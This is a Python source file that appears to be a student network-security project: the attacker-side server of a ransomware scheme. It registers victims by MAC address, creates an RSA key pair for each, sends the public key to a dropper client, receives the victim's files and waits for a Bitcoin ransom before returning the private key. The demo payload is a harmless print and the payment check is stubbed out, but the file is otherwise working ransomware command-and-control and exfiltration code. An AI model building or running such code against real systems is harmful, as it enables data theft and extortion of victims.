#!/usr/bin/env python3

""" Implementation of the server that sends some malicious code to its
    dropper client.
"""

import base64
import logging
import socket
import os
import subprocess
import errno
import time
from getmac import get_mac_address
import cryptowallet
import rsa

class Server:
    """ This class represents a server that stores some malicious payload and sends
    it to the dropper once the connection is established.
    """
   
    FORMAT = 'utf-8'
    IP_ADDR = '10.0.2.5'
    MAX_SIZE = 4096
    VICTIMS = []
    WORKING_DIR = '/home/netsec/server'
    CODE_PATH = '/home/netsec/server/mal.py'
    TRANSFER_DONE = False

    global initial_balance, WALLET_ADDRESS, bitcoin_needed 
    WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
    initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
    bitcoin_needed = 0.0; #Instantiate how much bitcoin is needed

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection using TCP protocol
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._transfer_done = False

    @property
    def malicious_code(self):
        """ Malicious payload. In this case just a demonstrative command. """
        return b'print("Hello there hahahaha")'

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        """ Sets the port the server listens to into {new_port}"""
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before the session. """
        try:
            # Binds the server to the port and listens to the port.
            self.socket.bind((Server.IP_ADDR, self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')



    
    def make_dir(self, dir_name):
        path = os.path.join(Server.WORKING_DIR, dir_name)
        os.mkdir(path)

    def generate_key_pair(self, vpath):
        public_key, private_key = rsa.newkeys(2048)

        with open(os.path.join(vpath , 'public_key.pem'), 'wb') as f:
            f.write(public_key.save_pkcs1('PEM'))

        with open(os.path.join(vpath, 'private_key.pem'), 'wb') as f:
            f.write(private_key.save_pkcs1('PEM'))

    def receive_victim_files(self, conn, mac):
        print("begin")
        path = os.path.join(Server.WORKING_DIR, mac)   
        data = conn.recv(Server.MAX_SIZE)
        print(data)
        filename = base64.b64decode(data).decode(Server.FORMAT)
        print(filename)
        data_file = ""
        size = 0

        if "DONE." in str(filename):
            self.TRANSFER_DONE = True

            return
        
        file_loc = os.path.join(path, filename)
        print("[RECV] Receiving the filename.")
        #try:
        file = open(file_loc, "w")
        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
        while "FILEDONE" not in data_file :
            data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT, errors="ignore")
            print("[RECV] Receiving the file data.")
            file.write(data_file)
            conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
            size+=len(data_file)
            print("size: "+str(size))

        print("file data: "+data_file)
        conn.sendall(base64.b64encode("FILEDONE RECEIVED".encode(Server.FORMAT)))

        file.close() 


    #Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null
    def check_if_user_paid(self):
        
        current_balance =  cryptowallet.get_balance(WALLET_ADDRESS)

        amount_paid = current_balance - initial_balance 
        
        paid  =  amount_paid == 0

        return paid
    
    # def remove_victim_files_from_server(self, mac):
    #     path = os.path.join(Server.WORKING_DIR, mac)
    #     shutil.rmtree(path)
    #     print("all files in the victim directory has been removed")

    def attack(self):
        # Establish a connection with the client.
        while True:
            connection, address = self.socket.accept()
            with connection:
                print('Connection with dropper established from {}'.format(address))

                victim_mac = get_mac_address(ip=address[0])

                victim_dir = os.path.join(Server.WORKING_DIR, victim_mac)

                if victim_mac not in Server.VICTIMS:
                    Server.VICTIMS.append(victim_mac)
                    try:
                        self.make_dir(victim_mac)
                    except OSError as e:
                        if e.errno == errno.EEXIST:
                            print('Directory not created')
                        else:
                            raise

                    self.generate_key_pair(victim_dir)
                    
                    key_name = base64.b64encode('public_key.pem'.encode(Server.FORMAT))
                    connection.sendall(key_name)
                    msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                    print("[CLIENT]: "+msg)

                    file = open(os.path.join(victim_dir, 'public_key.pem'), "rb")
                    key_data = file.read()
                    key = base64.b64encode(key_data)



                    
                    connection.sendall(key)
                    msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                    print("[CLIENT]: "+msg)

                    while(True):
                        self.receive_victim_files(connection, victim_mac)
                        if self.TRANSFER_DONE == True:
                            #Recieve the amount of bitcoin needed
                            print("yay")
                            global bitcoin_needed
                            bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
                            print(bitcoin_needed)
                            break
                    
                while (True):
                    #Every 5 seconds check if victim paid, if they did send them a message
                    time.sleep(5)
                    # paid = self.check_if_user_paid()


                    if(True):
                        # sends decryption key  (victim is also simulaenously checking if paid and if they have it recives the thingsb bellow)
                        """ Opening and reading the private key file. """
                        key_path = os.path.join(victim_dir, 'private_key.pem')

                        priv_key = open(key_path, "rb")
                        data = priv_key.read()
                        print(data)

                        print("sending private key")
                        """ Sending the filename to the server. """
                        connection.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
                        print("sent private key")
                        msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                        print("[CLIENT]: "+msg)

                        """ Sending the file data to the server. """
                        connection.sendall(base64.b64encode(data))
                        msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                        print("[CLIENT]: "+msg)
                        
                        """ Deleting the victim file from server """
                        # self.remove_victim_files_from_server(victim_mac)

                        """ Closing the file. """
                        file.close()  
                        break
                    break
                    
                    
if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    # It takes the port number 27000 (permanent) and will listen to this port.
    server = Server(27000)
    server.initialize()
    # Send a payload to the dropper client once it establishes a connection.
    server.attack()
